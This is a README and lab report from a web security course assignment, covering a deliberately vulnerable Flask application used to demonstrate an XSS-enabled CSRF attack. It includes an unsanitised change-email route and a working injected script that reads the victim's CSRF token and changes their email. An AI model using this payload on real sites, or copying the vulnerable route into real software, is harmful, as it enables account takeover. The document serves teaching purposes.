# CSRF-Web-Security
Simple Flask application containing a vulnerable's website. Cross-Site Request Forgery assignment for Web Security course

## Run the app with the following commands
You can try to perform the attack using the script provided at the end of the readme.

### Put these lines in you hosts file
```text
127.0.0.1 www.attacker.com
127.0.0.1 www.vulnerable.com
```
### Run these commands into your app's folder
```bash
$ export FLASK_APP=app.py; flask run
```
And search for http://www.vulnerable.com:5000 in your browser (log in with credentials provided in user.py file)

# CSRF and XSS Vulnerability Lab Report
Written by Elisa Rizzo, Pietro Visconti

## Introduction:
CSRF attacks aim to induce the victim to perform involuntary actions through which the attacker can modify or delete private information, or gain control of the target account.

## Attack Description:
The chosen challenge is the last one proposed, regarding the use of an XSS vulnerability to implement a CSRF attack with the purpose of modifying the email of every user who visits the page containing the injected script.

In this case, the attack consists of injecting a script that makes a request to the **my-account/change-password** endpoint. The focal point is to retrieve the victim's CSRF token so that the request created by the attacker is accepted. To do this, the script needs to access the document body and access the csrf attribute, as will be further detailed in the section regarding the attack reproduction on our Flask application.

## Vulnerability in Flask Application:
To build the Flask application, we started from the application provided in the previous exercise and modified it to include the XSS vulnerability necessary to trigger the CSRF attack.

Firstly, we configured the vulnerable site to include `flask_wtf.csrf`, the library required to activate protection against CSRF attacks, which generates a new token for each request, making the ones already used obsolete.

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()
csrf.init_app(app)
```

Additionally, we added a new route to allow users to change their email. This route retrieves the email field from the request body and assigns it to the user's email field.

```python
@vulnerable_blueprint.route("/change-email", methods=["POST"], host=VULNERABLE_DOMAIN)
def change_email():
    user = get_current_user()
    user.email = request.form.get('email');
    return user.email
```

The form for submitting the post includes a hidden input field, csrf_token, containing the CSRF token value to ensure the user's identity before the actual submission. No input sanitization is performed, introducing an XSS vulnerability that can be exploited to include tags, such as the script tag used in the actual attack, within the post body.

The attacker's script consists of the following steps:
1. It calls the `window.addEventListener('DOMContentLoaded')` function to execute the script once the HTML page is fully loaded in the client's browser.
2. Within the callback of this function, the CSRF attack is executed.
3. The CSRF token is retrieved from the DOM and stored in the `csrf` variable.
4. A `FormData` variable is created to create a form and fill it with the inputs that will be transmitted in the request body.
5. The following fields are added to the form:
   - `csrf_token`, required for the successful execution of the request.
   - the email chosen by the attacker.
6. An `XMLHttpRequest` variable is created and configured to make a `POST` request to the `/change-email` endpoint of the vulnerable site.
7. Finally, the request is sent.

```javascript
<script>
    window.addEventListener('DOMContentLoaded', function() {
        let csrf = document.getElementsByName("csrf_token")[0].value;
        let data = new FormData();
        data.append('csrf_token', csrf);
        data.append('email', 'lol@gmail.com');
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "http://www.vulnerable.com:5000/change-email", false);
        xhttp.send(data);
    });
</script>
```
